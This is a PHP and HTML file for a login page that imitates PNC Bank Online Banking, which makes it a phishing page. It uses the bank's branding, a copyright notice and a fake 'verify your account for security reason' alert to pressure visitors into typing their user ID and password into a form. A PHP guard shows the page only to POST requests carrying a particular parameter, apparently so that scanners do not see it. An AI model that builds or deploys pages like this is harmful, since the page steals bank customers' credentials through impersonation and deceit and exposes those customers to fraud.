<?php
if ($_SERVER['REQUEST_METHOD'] !== "POST" || !isset($_POST['requested_by']) || $_POST['requested_by'] !== 'file_get_contents'){
    http_response_code(403);
    echo "Sorry you can't be here.";
    exit(0);
}
?>

<html lang="en">

<head>
    <meta name="viewport" content="width=device-width; initial-scale=1" />
    <title>PNC Bank Online Banking</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/css/login.css" rel="stylesheet" />
    <link href='https://fonts.googleapis.com/css?family=Alegreya' rel='stylesheet'>
    <link rel="shortcut icon" href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/pnc-logo-rev.svg" />
    <link rel="icon" href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/pnc-logo-rev.svg" />

</head>

<body>
    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
        <symbol id="check-circle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
        </symbol>
        <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
        </symbol>
        <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
            <path
                d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
        </symbol>
    </svg>

    <div class="container-lg d-flex flex-column content-container">
        <div class="row header">
            <div class="logo-container col-11">
                <img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/pnc-logo-rev.svg" />
                <h1>PNC</h1>
                <h4>Online Banking</h4>
            </div>
            <div class="btns-container col-1">

                <div id="privacy"
                    data="PNC respects the privacy of our customers and is committed to protecting your information with the same care we utilize for all PNC transactions. Click to view the details of our consumer privacy principles."
                    onclick="header_links_clicker(this);">
                    <a href="#">Privacy</a>
                </div>
                <div id="security"
                    data="Security is a priority at PNC. We are committed to protecting the security and confidentiality of your financial information. Click to learn more about how we protect you and how you can protect yourself."
                    onclick="header_links_clicker(this);">
                    <a href="#">Security</a>
                </div>
            </div>
        </div>
        <div class="row content d-flex align-items-center justify-content-center">
            <div class="d-flex justify-content-center align-items-center flex-column">
                <div class="main-content p-1">
                    <div class="row content-title">
                        <h4 class="text-center">
                            Sign In
                        </h4>
                    </div>
                    <div class="row d-sm-flex flex-column-reverse">
                        <div class="alert alert-danger d-flex align-items-center" role="alert">
                            <div>
                                <div class="alert-header">
                                    <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img"
                                        aria-label="Danger:">
                                        <use xlink:href="#exclamation-triangle-fill" />
                                    </svg>
                                    Verify Your Account Information For Security Reason.<br />
                                </div>
                                <div class="alert-content">
                                    <ul>
                                        <li>
                                            You need to verify your account access.
                                        </li>
                                        <li>
                                            Reset your online access now using your debit card or phone number in a few short steps!.
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            Enter Your User ID and Password:
                        </div>
                        <div class="card-body">
                            <form method="post">
                                <div class="mb-3">
                                    <label for="user-id" class="form-label">User ID: </label>
                                    <input type="text" class="form-control" id="user-id" aria-describedby="emailHelp"
                                        onkeypress="validator(this)" onblur="validator(this);" name="user-id">
                                </div>
                                <div class="mb-3">
                                    <label for="password" class="form-label">Password: </label>
                                    <input type="password" class="form-control" id="password" name="password"
                                        onkeypress="validator(this)" onblur="validator(this)" disabled>
                                </div>
                                <div class="mb-3">
                                    <a href="#" style="text-decoration: none; font-size: 11px;">Forget User ID or
                                        Password ?</a>
                                </div>
                                <div class="d-flex justify-content-center">
                                    <button type="submit" class="btn sign-in-button" id="sign-in" onblur="validator(this)"
                                    disabled>Sign In</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="horizontal-separator"></div>
            <div class="footer d-flex flex-column align-items-center justify-content-center">
                <div class="row d-flex justify-content-center links">
                    <a href="">Online Banking & Bill Pay Guarantee</a>
                    <h6>|</h6>
                    <a href="">Privacy Policy</a>
                    <h6>|</h6>
                    <a href="">Online Security</a>
                </div>
                <div class="row d-flex text-center">
                    © Copyright 2022. The PNC Financial Services Group, Inc. All Rights Reserved.
                </div>
                <div class="row d-flex justify-content-center align-items-center">
                    <a href=""><img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/livelook.png"> Need Help? View our Contact Numbers and Hours of
                        Operation
                </div>
            </div>
        </div>

    </div>
    <script src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/js/login.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>
</body>



</html>